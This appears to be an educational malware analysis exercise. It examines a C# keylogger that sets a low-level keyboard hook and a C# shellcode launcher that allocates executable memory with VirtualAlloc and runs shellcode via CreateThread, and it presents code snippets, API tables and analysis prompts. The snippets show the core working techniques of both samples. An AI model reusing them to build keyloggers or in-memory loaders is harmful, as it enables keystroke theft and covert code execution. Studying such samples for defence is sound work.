# Malware Case Study: Keylogger and Shellcode Launcher

## Overview

In this case study, we will analyze two malware samples to understand how their API calls interact with the Windows operating system. The samples include:

1. A **C# Keylogger**
2. A **Shellcode Launcher**

---

## Keylogger

### API Calls and Hooks

The keylogger, written in C#, uses P/Invoke to obtain pointers for each API call. Below is a snippet of the P/Invoke definitions from the malware sample source code:

```csharp
[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
[return: MarshalAs(UnmanagedType.Bool)]
private static extern bool UnhookWindowsHookEx(IntPtr hhk);

[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
private static extern IntPtr GetModuleHandle(string lpModuleName);

private static int WHKEYBOARDLL = 13;

[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
private static extern IntPtr GetCurrentProcess();
```

### API Call Explanations

| **API Call**            | **Explanation**                                                                 |
|--------------------------|---------------------------------------------------------------------------------|
| `SetWindowsHookEx`       | Installs a memory hook into a hook chain to monitor for certain events.         |
| `UnhookWindowsHookEx`    | Removes an installed hook from the hook chain.                                 |
| `GetModuleHandle`        | Returns a module handle for the specified module if mapped into the process's address space. |
| `GetCurrentProcess`      | Retrieves a pseudo handle for the current process.                             |

### Hooking Process

The following snippet demonstrates how the keylogger sets a hook on the current process:

```csharp
public static void Main() {
    _hookID = SetHook(_proc);
    Application.Run();
    UnhookWindowsHookEx(_hookID);
    Application.Exit();
}

private static IntPtr SetHook(LowLevelKeyboardProc proc) {
    using (Process curProcess = Process.GetCurrentProcess()) {
        return SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(curProcess.ProcessName), 0);
    }
}
```

### Analysis

Using the Windows API documentation and the context of the above snippet, analyze the keylogger's objective and procedure. Assign the respective API calls to their roles in the sample.

---

## Shellcode Launcher

### API Calls

The shellcode launcher also uses P/Invoke to interact with the Windows API. Below is a snippet of the P/Invoke definitions from the malware sample source code:

```csharp
private static UInt32 MEM_COMMIT = 0x1000;
private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

[DllImport("kernel32")]
private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

[DllImport("kernel32")]
private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

[DllImport("kernel32")]
private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
```

### API Call Explanations

| **API Call**        | **Explanation**                                                                 |
|----------------------|---------------------------------------------------------------------------------|
| `VirtualAlloc`       | Reserves, commits, or changes the state of a region of pages in the virtual address space of the calling process. |
| `WaitForSingleObject`| Waits until the specified object is in the signaled state or the time-out interval elapses. |
| `CreateThread`       | Creates a thread to execute within the virtual address space of the calling process. |

### Shellcode Execution

The following snippet demonstrates how the shellcode is written to and executed from memory:

```csharp
UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);

IntPtr hThread = IntPtr.Zero;
UInt32 threadId = 0;
IntPtr pinfo = IntPtr.Zero;

hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
WaitForSingleObject(hThread, 0xFFFFFFFF);
return;
```

### Analysis

Using the Windows API documentation and the context of the above snippet, analyze the shellcode launcher's objective and procedure. Assign the respective API calls to their roles in the sample.

---

## Conclusion

This case study provides insights into how malware leverages Windows API calls for keylogging and shellcode execution. Use the provided snippets and explanations to deepen your understanding of these techniques.